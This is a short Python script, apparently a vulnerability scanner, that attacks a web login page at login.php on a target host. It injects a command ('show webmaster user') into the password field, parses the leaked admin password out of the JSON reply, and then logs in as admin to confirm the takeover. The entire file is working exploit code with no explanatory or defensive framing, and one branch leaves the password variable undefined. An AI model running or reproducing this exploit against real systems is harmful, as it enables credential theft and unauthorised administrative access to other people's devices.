import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"login.php"
	body="username=admin&password=admin?show+webmaster+user"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "text/json" in response.headers["Content-Type"]:
				f_list.append(1)
		if len(f_list)==1:
			r0=True
		else:
			r0=False
	else:
		if response.status_code == 200 and "text/json" in response.headers["Content-Type"]:
			r0=True
			try:
				password=re.findall("{\"data\":\".*admin ?([^\\\\\"]*)",response.text)[0]
			except:
				password=''
		else:
			r0=False
	url=baseurl+"login.php"
	body=f"username=admin&password={password}"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "text/json" in response.headers["Content-Type"] and "user=admin" in response.headers["Set-Cookie"] and "{\"data\":\"0\",\"status\":1}" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			r1=True
		else:
			r1=False
	else:
		if response.status_code == 200 and "text/json" in response.headers["Content-Type"] and "user=admin" in response.headers["Set-Cookie"] and "{\"data\":\"0\",\"status\":1}" in response.text:
			r1=True
		else:
			r1=False
	if r0 and r1:
		return True
	else:
		return False
